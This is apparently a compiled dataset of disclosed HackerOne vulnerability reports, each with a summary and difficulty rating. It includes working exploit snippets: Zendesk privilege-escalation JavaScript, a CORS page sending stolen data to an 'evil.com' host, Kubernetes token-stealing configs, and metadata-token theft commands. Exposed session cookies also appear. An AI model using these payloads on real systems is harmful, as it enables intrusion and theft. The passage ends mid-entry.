i found an vulnerability on https://my.stripo.email/cabinet/#/users/orog_id ,
generally every user have an organisation and the organisation contain projects ,
lets suppose : test@gmail.com is the owner of the project
and test2@gmail.com was invited to his project as admin , in normal situation the owner can not be removed even if second account is admin
the issue is i can removed the owned from hi position to admin , and the big problem once the owner is removed he can not login again to his account
Steps To Reproduce:
[add details for how we can reproduce the issue]
you must have 2 account , one owner , the second got invited as admin
log in with your second account and go to https://my.stripo.email/cabinet/#/users/xxxx
you will see that the input of role is disabled , enable it via inspect element ( f12) ,
then change the role of owner for it to admin , an PUT request will be sent
http request
PUT /cabinet/stripeapi/v1/organizations/135428/users HTTP/1.1
Host: my.stripo.email
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: application/json, text/plain, /
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Bearer null
Content-Type: application/json;charset=UTF-8
Cache-Control: no-cache
Pragma: no-cache
Expires: Sat, 01 Jan 2000 00:00:00 GMT
Content-Length: 231
Origin: https://my.stripo.email
Connection: close
Referer: https://my.stripo.email/cabinet/
Cookie: stripe_mid=f1a62f3d-2ba4-4742-a1ae-97c309223fec; stripe_sid=20155b5b-e547-4e52-9c4c-53fd4b08ed8a; _ga=GA1.2.472610903.1575449565; _gid=GA1.2.1705021668.1575449565; _fbp=fb.1.1575449579810.16963820; token=eyJhbGciOiJIUzI1NiJ9.eyJzZWN1cml0eUNvbnRleHQiOiJ7XCJ1c2VySW5mb1wiOntcImlkXCI6MTMwODUxLFwiZW1haWxcIjpcImFiZGVsbGFobmFkaTNAZ21haWwuY29tXCIsXCJsb2NhbGVLZXlcIjpcImVuXCIsXCJmaXJzdE5hbWVcIjpcInRlc3Q0NVwiLFwibGFzdE5hbWVcIjpcIm5cIixcImdhSWRcIjpcImJiYzBkNGExLWI5NDYtNDIwMy1iOTNmLTcxNjhmYmEyMWI5ZVwiLFwicGhvbmVzXCI6W10sXCJhY3RpdmVcIjpmYWxzZSxcImFjdGl2ZVByb2plY3RJZFwiOjEzNzg3NyxcImlzU3VwZXJVc2VyXCI6ZmFsc2UsXCJzdXBlclVzZXJWMlwiOmZhbHNlLFwib25seUZiQ3JlZGVudGlhbHNcIjpmYWxzZSxcInNldHRpbmdzRW1haWxTb3J0QnlcIjpcImNyZWF0ZWRUaW1lXCIsXCJzZXR0aW5nc0VtYWlsU29ydEFzY1wiOmZhbHNlLFwic2V0dGluZ3NUZW1wbGF0ZVNvcnRCeVwiOlwidXBkYXRlZFRpbWVcIixcInNldHRpbmdzVGVtcGxhdGVTb3J0QXNjXCI6ZmFsc2UsXCJjb2xvclwiOlwiI2ZiYTc2ZlwiLFwib3JnYW5pemF0aW9uSWRcIjoxMzA2NjUsXCJzdWJzY3JpcHRpb25UeXBlXCI6XCJGUkVFXCIsXCJjb25zZW50UmVjZWl2ZWRcIjp0cnVlLFwidGVtcGxhdGVDcmVhdGVkT25Mb2dpblwiOmZhbHNlLFwiZmlyc3RMb2dpblwiOmZhbHNlfSxcImlzc3VlZEF0XCI6MTU3NTQ1MDIzMDMxOH0ifQ.GidxPLc4Wu80JWxScUjLrq4nmLr2lEamONcWsATBQfY; intercom-session-b1m243ec=Tlk4aHpydmFMOTc5SlZRaGRabE43WUIwanoxdXAyNlowR3FWbE9oaXNDRm5mYlhRRHNBNjlyLzJOOWQybmtYQi0tZzUrdnd1enBReWhPM0J3M1N2SFIzUT09--a917964bb8221fad0a6d3e38fab8cde2af1efed4
{"repository":{},"idField":"id","entityType":"USER","id":135628,"role":"admin","organizationId":135428,"firstName":"TESt","lastName":"account","color":"#cc90e2","email":"pain45@wearehackerone.com","projectIds":[],"suspended":false}
http response :
HTTP/1.1 200
Server: nginx
Date: Wed, 04 Dec 2019 09:56:41 GMT
Content-Type: application/json;charset=UTF-8
Connection: close
Vary: Accept-Encoding
█████████
████
X-Frame-Options: sameorigin
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Length: 180
█████cc90e2","email":"pain45@wearehackerone.com","projectIds":[],"suspended":false}
i hope it is clear ,
thanks
Impact
an attacker ( already admin ) can remove the owner from his role , and the last one can not login any more to his account



================================================================================
Vulnerability Description:
An improper authorization vulnerability allows an admin user to demote the owner of a project to an admin role, which subsequently prevents the original owner from logging into their account. This occurs because the front-end validation can be bypassed by manipulating the disabled state of the role input field via browser developer tools.

Steps to Reproduce:
1. Log in with an admin account that has been invited to the owner's project.
2. Navigate to the user management page: https://my.stripo.email/cabinet/#/users/xxxx (replace xxxx with the organization ID).
3. Inspect the page (F12) and enable the disabled role input field for the owner's account.
4. Change the owner's role from 'owner' to 'admin' and observe the PUT request being sent.
Exploitation Difficulty:
The vulnerability involves a straightforward bypass of front-end controls without requiring complex interactions or deep understanding of the application's state. The attack is simple to execute once the admin privileges are obtained and the role input field is identified.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/792927: Email address of any user can be queried on Report Invitation GraphQL type when username is known
================================================================================
RAW DESCRIPTION:

Summary:
Email id of all hackerone users disclosure
Description:
There is an flaw , with that i can get all hackerone users email id
Steps To Reproduce
Invoke the below graphql call
POST /graphql HTTP/1.1
{"query":"mutation Revoke_credential_mutation($input_0:AddReportParticipantInput!) {addReportParticipant(input:$input_0) {clientMutationId,...F1}} fragment F1 on AddReportParticipantPayload {clientMutationId,was_successful,errors{nodes{message}},invitation{email,token}}","variables":{"input_0":{"report_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82MjYzNzE=","email":"██████████","username":"jobert"}}}
you will get below response
Code 146 Bytes
1{"data":{"addReportParticipant":{"clientMutationId":null,"was_successful":true,"errors":{"nodes":[]},"invitation":{"email":"████","token":null}}}}
to reproduce from your account, create one test program, and create one report for that program, get that report id gid://hackerone/Report/626371 (here 626371 my test program's report id) convert it into base 64, replace that id with the "report_id" in the above graphql query
Done
Impact
PII disclosed



================================================================================
Vulnerability Description:
The vulnerability allows any HackerOne user's email address to be queried through the Report Invitation GraphQL type by knowing their username, leading to unauthorized disclosure of personal identifiable information (PII).

Steps to Reproduce:
1. Create a test program and a report within it on HackerOne to obtain a report ID.
2. Convert the report ID to base64 and use it in a GraphQL mutation query to add a participant, specifying a known username to retrieve the associated email address.
Exploitation Difficulty:
The attack involves understanding GraphQL queries and manipulating the report invitation feature, but the steps are straightforward once the GraphQL endpoint and required parameters are known.

--------------------------------------------------------------------------------



Privilege Escalation Vulnerabilities (13 reports)
--------------------------------------------------

Report https://hackerone.com/reports/1108874: Password Reset link hijacking via Host Header Poisoning leads to account takeover
================================================================================
RAW DESCRIPTION:

Description:
████████ uses the Host header when sending out password reset links. This allows an attacker to insert a malicious host header, leading to password reset link / token leakage.
References
http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html
https://hackerone.com/reports/226659
Impact
The victim will receive the malicious link in their email, and, when clicked, will leak the user's password reset link / token to the attacker, leading to full account takeover.
System Host(s)
███
Affected Product(s) and Version(s)
CVE Numbers
Steps to Reproduce
1.) Open up Firefox and Burp Suite.
2.) Visit the forgot password page (http://██████/█████)
3.) Enter the victim's email address and click on SEND RESET LINK.
4.) Intercept the HTTP request in Burp Suite & change the Host Header to your malicious site/server ex. ███.
5.) Forward the request and you'll be redirected to your server.
The victim will then receive a password reset e-mail with your poisoned link.
If the victim clicks the link, the reset token will be leaked and the attacker will be able to find the reset token in the server logs. The attacker can then browse to the reset page with the token and change the password of the victim account!
Suggested Mitigation/Remediation Actions
Use $_SERVER['SERVER_NAME'] rather than $_SERVER['HTTP_HOST']



================================================================================
Vulnerability Description:
The vulnerability involves the application using the Host header to generate password reset links, which can be manipulated by an attacker to point to a malicious server. This leads to the leakage of the password reset token when the victim clicks the link in the email, allowing the attacker to take over the account.

Steps to Reproduce:
1. Open Firefox and Burp Suite.
2. Visit the forgot password page (http://██████/█████).
3. Enter the victim's email address and click on SEND RESET LINK.
4. Intercept the HTTP request in Burp Suite & change the Host Header to your malicious site/server ex. ███.
5. Forward the request and you'll be redirected to your server.
Exploitation Difficulty:
The attack requires understanding of HTTP headers and the ability to intercept and modify requests, which is a common skill among security testers. The interaction between the Host header and the password reset functionality is straightforward once identified.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1249583: Authenticated kubernetes principal with restricted permissions can retrieve ingress-nginx serviceaccount token and secrets across all namespaces
================================================================================
RAW DESCRIPTION:

Summary:
Retrieving ingress-nginx serviceaccount token
ingress-nginx allows adding custom snippets of nginx configuration to Kubernetes ingress objects. These snippets can be applied to either the relevant location {} or server {} blocks with the following annotations, respectively.
https://kubernetes.github.io/ingress-nginx/user-guide/nginx-configuration/annotations/#configuration-snippet
https://kubernetes.github.io/ingress-nginx/user-guide/nginx-configuration/annotations/#server-snippet
Inside the server {} block we can add a custom snippet of lua-code that reads the serviceaccount token that is mounted inside the ingress-nginx pod. We then set it as an nginx variable and return it to the client at a configured location. This might look like this:
Code 396 Bytes
1    nginx.ingress.kubernetes.io/server-snippet: |
2      set_by_lua $token '
3        local file = io.open("/run/secrets/kubernetes.io/serviceaccount/token")
4        if not file then return nil end
5        local content = file:read "*a"
6        file:close()
7        return content
8      ';
9
10      location = /token {
11        content_by_lua_block {
12          ngx.say(ngx.var.token)
13        }
14      }
Impact
The ingress-nginx serviceaccount has the permissions to list secrets across all namespaces. With the ingress-nginx serviceaccount's token a user, with otherwise restricted privileges, can at least:
exfiltrate all kubernetes secrets
get tokens of all kubernetes serviceaccounts; allowing an attacker to elevate his privileges to potentially cluster-admin
Vendors such as rancher-labs bundle ingress-nginx, or a forked version of ingress-nginx, with their software. Solutions provided by these vendors might also be vulnerable.
kube-apiserver proxy
ingress-nginx can be configured to expose the Kubernetes kube-apiserver by creating a Kubernetes Service of type ExternalName and pointing it to kubernetes.default; the hostname at which the kubernetes api is available inside the cluster. This can expose an otherwise private and protected kube-apiserver to untrusted networks like the internet.
Requirements to exploit
To successfully exploit this vulnerability an attacker would need access to an already authenticated user or serviceaccount that has the permissions to create the following resources inside kubernetes:
ingress
service
Additionally the attacker needs network access to the ingress-nginx-controller loadbalancer or in-cluster service to retrieve the ingress-nginx serviceaccount token. The hostname configured in the ingress object does not necessarily have to resolve to the ingress-nginx-controller's loadbalancer; ingress-nginx will also serve us the token if we manually add the Host-header.
Kubernetes Version:
Any, as far as I am aware. This was tested with AWS EKS 1.20.
Component Version:
Any, as far as I am aware. This was tested with the following release of ingress-nginx:
chart: ingress-nginx-3.33.0
application: 0.47.0
Steps To Reproduce:
I created a proof-of-concept (poc.sh) that requires the following:
A kubernetes cluster with ingress-nginx installed; ingress-nginx should not be restricted to a single namespace
A local kubeconfig file configured to communicate with the kubernetes cluster
A user configured in the kubeconfig file with the permissions to create ingress and service objects in the namespace configured in the kubeconfig context
The proof-of-concept requires setting the INGRESS_HOST environment variable. This variable should contain a hostname that resolves to the ingress-nginx-controller's loadbalancer. This is made easy on clusters where a wildcard DNS-record is pointing to the loadbalancer.
When invoked, the script will:
Apply the required ingress and service;
exposing the ingress-nginx serviceaccount token at https://$INGRESS_HOST/token
proxying all requests to the kubernetes apiserver at https://$INGRESS_HOST
exposing the ingress-nginx serviceaccount token at https://$INGRESS_HOST/token
proxying all requests to the kubernetes apiserver at https://$INGRESS_HOST
Retrieve the ingress-nginx serviceaccount token
Write a local kubeconfig;
Using the kube-apiserver proxy
Using the ingress-nginx serviceaccount token
Using the kube-apiserver proxy
Using the ingress-nginx serviceaccount token
Write secrets from all namespaces to a local file called secrets.json
For each serviceaccount token found in secrets.json check if the serviceaccount has cluster-admin privileges. If so, create a new user and context in the local kubeconfig file with the serviceaccount's token
Supporting Material/References:
file	description
ingress.yaml	kubernetes manifest used to create required service and ingress objects
poc.sh	proof-of-concept written in bash
output.png	output of running poc.sh against local test cluster<br>getting cluster-admin by finding the serviceaccount tokens of flux and flux-helm-operator
Impact
exfiltrate all kubernetes secrets
get tokens of all kubernetes serviceaccounts; allowing an attacker to elevate his privileges to potentially cluster-admin



================================================================================
Vulnerability Description:
An authenticated Kubernetes principal with restricted permissions can retrieve the ingress-nginx serviceaccount token and secrets across all namespaces by exploiting custom nginx configuration snippets. This allows exfiltration of all Kubernetes secrets and potential privilege escalation to cluster-admin.

Steps to Reproduce:
1. Create an ingress object with a custom server-snippet annotation that reads and exposes the ingress-nginx serviceaccount token.
2. Use the exposed token to list secrets across all namespaces and potentially elevate privileges to cluster-admin.
Exploitation Difficulty:
The attack involves multiple components (ingress configuration, serviceaccount tokens, nginx snippets) and requires understanding of both Kubernetes RBAC and nginx configuration. The interaction between these components is non-obvious, particularly the ability to use nginx snippets to expose serviceaccount tokens.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1382919: Ingress-nginx path allows retrieval of ingress-nginx serviceaccount token
================================================================================
RAW DESCRIPTION:

Report Submission Form
Summary:
A user with the permissions to create an ingress resource can obtain the ingress-nginx service account token which can list secrets is all namespaces (cluster wide).
Kubernetes Version:
1.20 (should work on (1.21 as well)
Component Version:
nginx ingress controller v1.0.4
Steps To Reproduce:
I deployed the latest ingress-controller (v1.0.4).
I used a user (gaf_test) that has the permissions to get, create and update ingress resources
(the “get” permissions is only to allow kubectl to view the newly created resource).
ingress-creator-role.yaml
Code 212 Bytes
1apiVersion: rbac.authorization.k8s.io/v1
2kind: Role
3metadata:
4  name: ingress-creator
5  namespace: default
6rules:
7- apiGroups: ["networking.k8s.io"]
8  resources: ["ingresses"]
9  verbs: ["get", "create", "update"]
ingress-creator-role-binding.yaml
Code 292 Bytes
1apiVersion: rbac.authorization.k8s.io/v1
2kind: RoleBinding
3metadata:
4  name: gaf_test-ingress-creator-binding
5  namespace: default
6subjects:
7- kind: User
8  name: gaf_test
9  apiGroup: rbac.authorization.k8s.io
10roleRef:
11  kind: Role
12  name: ingress-creator
13  apiGroup: rbac.authorization.k8s.io
<image_0>
Use this user (gaf_user) to create a new ingress resource in the default namespace.
ingress.yaml
Code 413 Bytes
1apiVersion: networking.k8s.io/v1
2kind: Ingress
3metadata:
4  name: gaf-ingress
5  annotations:
6    kubernetes.io/ingress.class: "nginx"
7spec:
8  rules:
9  -  http:
10      paths:
11        - path: /gaf{alias /var/run/secrets/kubernetes.io/serviceaccount/;}location ~* ^/aaa
12          pathType: Prefix
13          backend:
14            service:
15              name: some-service
16              port:
17                number: 5678
Code 29 Bytes
1kubectl apply -f ingress.yaml
<image_1>
Access to nginx ingress loadbalancer to /gaf/token path.
https://<host>/gaf/token
<image_2>
<image_3>
The nginx-ingress service account is bound to the nginx-ingress cluser role that can list secrets in all namespaces.
The Root Cause
When a user creates an ingress resource, the new configuration is updated in the /etc/nginx/nginx.conf file in the ingress-nginx-controller pod located in the nginx-ingress namespace.
I caused a “config file injection” using the following payload as path:
/gaf{alias /var/run/secrets/kubernetes.io/serviceaccount/;}location ~* ^/aaa
The payload above creates the following configuration for nginx:
/etc/nginx/nginx.conf
<image_4>
This is the relevant part from the configuration which creates a new route to /gaf path and uses an alias (http://nginx.org/en/docs/http/ngx_http_core_module.html#alias)
that maps to /var/run/secrets/kubernetes.io/serviceaccount/ directory on the ingress-nginx-controller pod.
Impact
A user with the permissions to create an ingress resource can obtain the ingress-nginx service account token which can list secrets is all namespaces (cluster wide).



================================================================================
Vulnerability Description:
A user with permissions to create an ingress resource can inject a malicious path configuration that exposes the ingress-nginx service account token, which has cluster-wide permissions to list secrets in all namespaces.

Steps to Reproduce:
1. Deploy the latest ingress-controller (v1.0.4) and create a user with permissions to get, create, and update ingress resources.
2. Create an ingress resource with a malicious path configuration that injects an alias directive to expose the service account token directory.
3. Access the exposed service account token via the manipulated path on the nginx ingress load balancer.
Exploitation Difficulty:
The vulnerability requires knowledge of nginx configuration directives and the ability to manipulate ingress resources to inject malicious paths. The interaction between the ingress resource and the nginx configuration is non-obvious and requires understanding of both Kubernetes RBAC and nginx alias directives.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/158330: Ability to access all user authentication tokens, leads to RCE
================================================================================
RAW DESCRIPTION:

Vulnerability details
The project export feature serializes the user objects of team members and stores it in the project.json file. This object contains the authentication_token for every user, meaning that an attacker can simply go ahead and create a project on GitLab.com, add one of the admins of GitLab.com, create an export, and obtain the authentication token for that user.
Proof of concept
Follow these steps to reproduce the issue:
create a test account on a GitLab instance and create a temporary repository
invite an admin of the GitLab instance as a team member to the repository
go to the repository settings and create an export
wait a few minutes until you received the export email
now go to http://gitlab-instance/account/repo/download_export
unzip the downloaded file and examine projects.json - the project_members will contain the user object that contains the authentication_token
Here's the first few bytes of rspeicher (sorry Robert) his authentication token on GitLab.com: ZyhqJr4XJZ.... Someone could get access to GitLab's admin panel by extracting the token of an admin and go to https://gitlab.com/admin/users?authentication_token=<token>. From what I've seen on my own GitLab instance, this leads to RCE and gives me access to all code in private repositories. Let me know if you need more information!



================================================================================
Vulnerability Description:
The project export feature serializes the user objects of team members and stores it in the project.json file, including the authentication_token for every user. An attacker can create a project, add an admin, export the project, and obtain the admin's authentication token, leading to potential RCE and access to private repositories.

Steps to Reproduce:
1. create a test account on a GitLab instance and create a temporary repository
2. invite an admin of the GitLab instance as a team member to the repository
3. go to the repository settings and create an export
4. wait a few minutes until you received the export email
5. now go to http://gitlab-instance/account/repo/download_export
6. unzip the downloaded file and examine projects.json - the project_members will contain the user object that contains the authentication_token
Exploitation Difficulty:
The attack involves multiple steps but follows a logical sequence of actions that are not overly complex or subtle. The vulnerability arises from a straightforward oversight in the export feature's handling of sensitive data.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1636552: Email Verification Bypass Allows Users to Add & verify Any Email  As Guardians Email 
================================================================================
RAW DESCRIPTION:

<image_0>
Now keep victims email as parent's email for example here I am keeping info@khanacademy.org as parents email and click on signup. ████
Now you will see a following message "Your parent or guardian must approve your account or it will be deleted in 7 days". ██████
Now go to https://www.khanacademy.org/settings/account and update your email to temporary email or any email you have access to. ██████████ ██████
Now, you will receive a verification email in your temporary email you have access to. But don't click on the email. Now again change the email to info@khanacademy.org.
<image_1>
This is the account that I created : Username : ██████ Password : ██████████ Email : ████
█████████
Impact
Attacker is able to bypass email verification.



================================================================================
Vulnerability Description:
The vulnerability allows an attacker to bypass email verification by exploiting a flaw in the account email update flow. By temporarily switching to a controllable email and then reverting to the victim's email, the system incorrectly marks the victim's email as verified without proper authorization.

Steps to Reproduce:
1. Sign up with a victim's email (e.g., info@khanacademy.org) as the guardian's email and proceed with registration.
2. After receiving the 'parent approval required' message, go to account settings and change the email to a temporary email you control.
3. When the verification email arrives at the temporary email, do not click it. Instead, revert the email back to the victim's email (info@khanacademy.org).
4. The victim's email is now verified without their consent, bypassing the intended verification process.
Exploitation Difficulty:
The attack involves multiple steps and requires understanding the email verification flow, but the interaction between changing emails and the verification state is not overly complex or novel. The steps are somewhat sequential and logical once the initial bypass idea is conceived.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1819668: Brave News feeds can open arbitrary chrome: URLs
================================================================================
RAW DESCRIPTION:

Summary:
URL link in Brave News feeds can open arbitrary chrome: URLs.
This behavior can be exploited as a way to bypass SOP and gain access to privileged URLs.
Products affected:
1.46.144 Chromium: 108.0.5359.128 (Official Build) （x86_64）
Steps To Reproduce:
Open new tab and click customize button
Follow https://csrf.jp/brave/rss_chrome.php as a RSS feed of Brave News
Reload the tab
RSS feeed that name is "Access chrome: URLs" is shown on Brave News
Click the feed
chrome://settings/resetProfileSettings?origin=userclick is opened on the tab
Supporting Material/References:
See the demonstration movie I attached
Impact
Bypass SOP and gain access to privileged URLs.



================================================================================
Vulnerability Description:
The vulnerability allows URLs in Brave News feeds to open arbitrary 'chrome:' URLs, bypassing the Same-Origin Policy (SOP) and accessing privileged URLs.

Steps to Reproduce:
1. Open a new tab in Brave browser and click the 'Customize' button.
2. Add the RSS feed 'https://csrf.jp/brave/rss_chrome.php' to Brave News.
3. Reload the tab to see the RSS feed titled 'Access chrome: URLs' in Brave News.
4. Click the feed to open 'chrome://settings/resetProfileSettings?origin=userclick' in the tab.
Exploitation Difficulty:
The attack involves a straightforward manipulation of RSS feed URLs to trigger privileged chrome: URLs, without requiring complex interactions or state manipulations. The discovery mainly relies on testing the behavior of RSS feeds in Brave News.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1842829: Privilege Escalation in kOps using GCE/GCP Provider
================================================================================
RAW DESCRIPTION:

Summary:
When using kOps with the GCP provider, it is possible for a user with shell access to any pod, to escalate their privileges to cluster admin. During provisioning of the cluster, kOps gives all nodes access to the state storage bucket through the service account associated with the instance. Any user with shell access can request the service account credentials, and read sensitive information from the state store. Using this information, the user can privesc to cluster admin, compromising the entire cluster. It is further possible to compromise a privileged GCP service account associated with the control-plane nodes and takeover other resources in the GCP project.
Kubernetes Version:
Kubernetes: v1.25.5
Component Version:
kOps: v1.25.3
Steps To Reproduce:
Cluster Setup:
The test cluster was setup as close to the getting started guide as possible.
Code 371 Bytes
1export KOPS_STATE_STORE=gs://kops-state-test/
2export PROJECT=`gcloud config get-value project`
3
4gsutil mb $KOPS_STATE_STORE
5kops create cluster kops.k8s.local --zones europe-west1-b --state ${KOPS_STATE_STORE} --project=$PROJECT --master-size=n1-standard-2 --node-size=n1-standard-2
6kops update cluster --name kops.k8s.local --yes --admin
7kops validate cluster --wait 10m
Privesc
Add a demo container in which user is allow shell access (manifest attached): k apply -f shell.yaml
Give ourselves a shell: k exec -it shell-5d64dd647c-8l8s6 -it -- ash
pod$ wget --header 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -O default.token

k cp shell-5d64dd647c-8l8s6:/default.token default.token
gcloud auth revoke

mkdir -p keys

cd keys

export KUBECONFIG=./pwn.kconfig

Check we are cluster-admin k auth can-i '*' '*' -A
Deploy a pod on the master node (example manifest included), make sure to edit to the correct node name k apply -f shell-master.yaml
Give ourselves a shell: k exec -it shell-78d66f6f7c-ft7ch -it -- ash
pod$ wget --header 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -O admin.token
k cp shell-78d66f6f7c-ft7ch:/admin.token admin.token
export CLOUDSDK_AUTH_ACCESS_TOKEN=$(jq .access_token -r ./admin.token)
gcloud compute instances create miner --image-family=ubuntu-2204-lts --zone=europe-west1-b --image-project=ubuntu-os-cloud
Supporting Material/References:
shell.yaml - basic alpine deployment to simulator a user with shell access
shell-master.yaml - similar simple deployment, targeting a master node
csr.json - used to configure cfssl to generate the malicious system:masters mTLS certs
auth-can-i.png - proof we have cluster admin
miner.png - proof we can spin up arbitrary instances
Kubernetes Engine Service Agent Role
Tools used
https://github.com/cloudflare/cfssl
https://github.com/mikefarah/yq
Impact
Once the attacker has compromised the cluster, they have access to all cluster resources. This includes any secrets/data stored by the cluster and also any secrets/data that is accessible by any GCP service accounts in use by the cluster. As the attacker is able to compromise the cluster, they can compromise the master nodes. In GCE kOps, the master node service accounts have the "Kubernetes Engine Service Agent" role, which is highly permissive, and would likely allow the compromise of other resources in the GCP project. Since the role has compute create permissions, it could also be abused for attacks such as crypto-mining.



================================================================================
Vulnerability Description:
The vulnerability allows a user with shell access to any pod in a kOps-managed GCP cluster to escalate privileges to cluster admin by accessing the GCE metadata service to retrieve service account tokens. These tokens can then be used to access the kOps state storage bucket, retrieve sensitive cluster information, and further escalate privileges to compromise the entire cluster and potentially other GCP resources.

Steps to Reproduce:
1. Set up a kOps cluster on GCP following the standard guide
2. Deploy a pod with shell access in the cluster
3. Access the pod's shell and retrieve the default service account token from the GCE metadata server
4. Use the token to authenticate and access the kOps state storage bucket
5. Retrieve sensitive cluster information from the state store
6. Use the information to escalate privileges to cluster admin
7. Deploy a pod on a master node to access the master service account token
8. Use the master service account token to create arbitrary GCP resources
Exploitation Difficulty:
The attack involves multiple components (GCE metadata service, kOps state storage, Kubernetes RBAC) and requires understanding how kOps manages state and permissions in GCP. However, the steps to exploit are relatively straightforward once the initial access is obtained, and the interaction between components is not particularly subtle or novel.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2188569: Privilege escalation - Support-Contributor to Support and Product Admin via `/api/v2/██████` . No ADMIN PRIVILEGE required.
================================================================================
RAW DESCRIPTION:

Hello team, I am reporting another privilege escalation issue where a lowest privilege member(Support-Contributor) to full Support and Product administrator. Tested in Zendesk Enterprise(Sponsored) and Trial Account.
From my past reports I was able to find privilege escalation issues on the endpoint /api/███ . The difference is, to perform a privilege escalation on the said endpoint, there should be at least one Product Admin privilege on the actor's account but this report does not require any Admin privilege(just the lowest privilege alone).
Summary:
The Contributor Role is the lowest Support role in Zendesk. In the UI alone, as a contributor, the accessible pages and and endpoints are very limited. With this role, the members page is not even accessible or restricted. With these restrictions, escalating your own role seem to be impossible.
Improper Access Control to Privilege Escalation
Vulnerable Endpoint: PUT /api███ HTTP/2
The /api████████ endpoint is used for API integration to █████. █████████ . However, the said endpoint does not validate the privilege of the user who is sending a request. With this bug, a member with even just the lowest privilege(Contributor) is able to escalate any members' privilege to FULL ADMINISTRATOR including its own privilege.
Browsers Verified In:
Latest version of Chrome and Firefox
Exploit
Code 906 Bytes
1//Exploit
2//get csrf token and id
3var xhttp = new XMLHttpRequest();
4xhttp.onreadystatechange = function() {
5    if (this.readyState == 4 && this.status == 200) {
6        var profile = JSON.parse(this.responseText);
7        var csrf = profile.user.authenticity_token;
8		var id = profile.user.id;
9        escalate(id, csrf);
10    }
11};
12
13xhttp.open("GET", "https://" + document.domain + "/api/v2/users/me.json");
14xhttp.send();
15
16
17//privilege escalation function
18function escalate(id, csrf) {
19    var xhttp = new XMLHttpRequest();
20    xhttp.onreadystatechange = function() {
21        if (this.readyState == 4 && this.status == 200) {
22            console.log(this.responseText);
23        }
24    };
25
26    xhttp.open("PUT", "https://" + document.domain + "/api██████;
27    xhttp.setRequestHeader("X-Csrf-Token", csrf);
28    xhttp.setRequestHeader("Content-Type", "application/json");
29    xhttp.send(JSON.stringify(███));
30}
Steps To Reproduce:
On owner/admin account
Go to https://<domain>.zendesk.com/admin/people/team/members/new
Provide the name and email of the agent
Click Next
Set the Support role to CONTRIBUTOR
Go to https://<domain>.zendesk.com/admin/people/team/members
Click the profile on the invited user
Now set the roles to Support-Contributor only and DISABLE any product access(just to prove that no other privilege is required).
On invited user
8. You will receive an email. Click it to accept the invitation
9. Login the invited account
10. Execute the exploit to escalate your privileges.
Demo And PoC
On Enterprise account
███
On Trial account
███
Impact
Privilege escalation - Support-Contributor to Support and Product Admin.



================================================================================
Vulnerability Description:
A privilege escalation vulnerability allows a user with the lowest privilege (Support-Contributor) to elevate their own or others' privileges to full Support and Product Administrator by exploiting an improperly secured API endpoint.

Steps to Reproduce:
1. Create a new user with the lowest privilege (Support-Contributor) in Zendesk.
2. Execute the exploit code in the browser's console to escalate privileges to Support and Product Admin.
Exploitation Difficulty:
The vulnerability involves a straightforward exploitation of an API endpoint that lacks proper privilege validation. The attack does not require complex interactions or understanding of multiple components, making it relatively easy to discover and exploit.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2450685: Unauthorized access to PII leads to Administrator account Takeover
================================================================================
RAW DESCRIPTION:

Summary:
This vulnerability is present in the wp-json/wp/v2/users/15 file located in the wordpress directory endpoints. This flaw arises from insufficient restrictions placed on the list of post authors, which can be exploited by remote attackers to obtain sensitive information through wp/v2/users/15 requests attackers can obtain sensitive information in the form of email addresses (PII Leaks) and will be used in wp-login to send forget password or brute-force password requests.
Descriptions:
An cross-origin resource sharing (CORS) policy controls whether and how content running on other domains can perform two-way interaction with the domain that publishes the policy. The policy is fine-grained and can apply access controls per-request based on the URL and other features of the request. If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information. This bug could be used to steal users information or force the user to execute unwanted actions. As long that a legit and logged in user is lure to access a attacker controlled HTML page CORS misconfiguration is found on vanillaforums.com as Access-Control-Allow-Credentials: true.
Platform(s) Affected: [website]
https://www.mtn.com/wp-json/wp/v2/users/15
Steps To Reproduce:
Navigate visit hostname or directory on https:\/\/www.mtn.com\/wp-json\/wp\/v2\/users\/9
Intercept request to burp-suite and you will see unauthenticated APIs administrator_login email address exposed
<image_0>
copy this scripts and save file as .html and open in our browsers
Code 771 Bytes
1<!DOCTYPE html>
2<html>
3<body>
4<center>
5<h3>Steal administrator PII data!</h3>
6<html>
7<body>
8<button type='button' onclick='cors()'>Exploit</button>
9<p id='demo'></p>
10<script>
11function cors() {
12var xhttp = new XMLHttpRequest();
13xhttp.onreadystatechange = function() {
14if (this.readyState == 4 && this.status == 200) {
15var a = this.responseText; // Sensitive data from niche.co about user account
16document.getElementById("demo").innerHTML = a;
17xhttp.open("POST", "http://burpcollaborator-intruder-evil.com", true);// Sending that data to Attacker's website
18xhttp.withCredentials = true;
19console.log(a);
20xhttp.send("data="+a);
21}
22};
23xhttp.open("GET", "https://www.mtn.com/wp-json/wp/v2/users/15", true);
24xhttp.withCredentials = true;
25xhttp.send();
26}
27</script>
28</body>
29</html>
<image_1>
Supporting Material/References:
It's possible to remove this access for anyone by change the source code where when someone request the Rest API and the server send a 404 (Not Found) message for the user who made the request.
It's also possible to create a rewrite rule on .htaccess (if the webserver it's Apache) to redirect any request that contain rest_route (eg.: "^.rest_route=/wp-json/wp/v2/users/15") to a Not Found (404) or a Default Page.
Impact
Attacker get sensitive information PII Leaks (email adress)
Attacker can brute-force the password use the valid administrator login
CORS Misconfiguration, could lead to disclosure of sensitive information
Attacker would treat many victims to visit attacker's website, if victim is logged in, then his personal information is recorded in attacker's server.
This website using Wordpress , so developer forget to enable authenticator in the APIs that can view information of admin user. By access to this link, attacker can get username and email_address and other information of user admin.



================================================================================
Vulnerability Description:
